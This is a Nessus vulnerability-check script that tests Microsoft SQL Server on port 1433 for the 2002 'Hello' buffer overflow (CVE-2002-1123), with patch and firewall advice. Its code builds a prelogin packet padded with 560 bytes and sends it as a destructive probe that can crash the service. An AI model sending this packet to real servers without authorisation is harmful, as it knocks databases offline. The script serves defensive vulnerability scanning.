##
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# this script tests for the "You had me at hello" overflow
# in MSSQL (tcp/1433)
# Copyright Dave Aitel (2002)
# Bug found by: Dave Aitel (2002)
#
##
#TODO:
#techically we should also go to the UDP 1434 resolver service
#and get any additional ports!!!


if(description)
{

 script_id(11067);
 script_bugtraq_id(5411);
 script_cve_id("CVE-2002-1123");
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-B-0007");
 script_version ("$Revision: 1.13 $");
 name["english"] = "Microsoft's SQL Hello Overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote MS SQL server is vulnerable to the Hello overflow.

An attacker may use this flaw to execute commands against
the remote host as LOCAL/SYSTEM, as well as read your database content. 

*** This alert might be a false positive.

Solution : Install Microsoft Patch Q316333 at
http://support.microsoft.com/default.aspx?scid=kb;en-us;Q316333&sd=tech
or disable the Microsoft SQL Server service or use a firewall to protect the
MS SQL port (1433).

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Microsoft's SQL Hello Overflow";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK); 
 
 script_copyright(english:"This script is Copyright (C) 2002 Dave Aitel");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_require_ports(1433, "Services/mssql");
 script_dependencie("mssqlserver_detect.nasl", "mssql_version.nasl"); 
 exit(0);
}


version = get_kb_item("mssql/SQLVersion");
if(version)
{
 if(!ereg(pattern:"^8\.00\.(0?[0-5][0-9][0-9]|0?6[0-5][0-9]|66[0-4])",
 	  string:version))exit(0);
}


#
# The script code starts here
#
#taken from mssql.spk
pkt_hdr = raw_string(
0x12 ,0x01 ,0x00 ,0x34 ,0x00 ,0x00 ,0x00 ,0x00  ,0x00 ,0x00 ,0x15 ,0x00 ,0x06 ,0x01 ,0x00 ,0x1b
,0x00 ,0x01 ,0x02 ,0x00 ,0x1c ,0x00 ,0x0c ,0x03  ,0x00 ,0x28 ,0x00 ,0x04 ,0xff ,0x08 ,0x00 ,0x02
,0x10 ,0x00 ,0x00 ,0x00
);

#taken from mssql.spk
pkt_tail = raw_string (
0x00 ,0x24 ,0x01 ,0x00 ,0x00
);

#techically we should also go to the UDP 1434 resolver service
#and get any additional ports!!!
port = get_kb_item("Services/mssql");
if(!port)port = 1433;

found = 0;
report = "The SQL Server is vulnerable to the Hello overflow.";


if(get_port_state(port))
{
    soc = open_sock_tcp(port);

    if(soc)
    {
    	#uncomment this to see what normally happens
        #attack_string="MSSQLServer";
	#uncomment next line to actually test for overflow
	attack_string=crap(560);
        # this creates a variable called sql_packet
	sql_packet = string(pkt_hdr,attack_string,pkt_tail);
	send(socket:soc, data:sql_packet);
        r  = recv(socket:soc, length:4096);
	close(soc);
	#display ("Result:",r,"\n");
	if(!r)
	    {
	    # display("Security Hole in MSSQL\n");
            security_hole(port);
	    }
    }
}
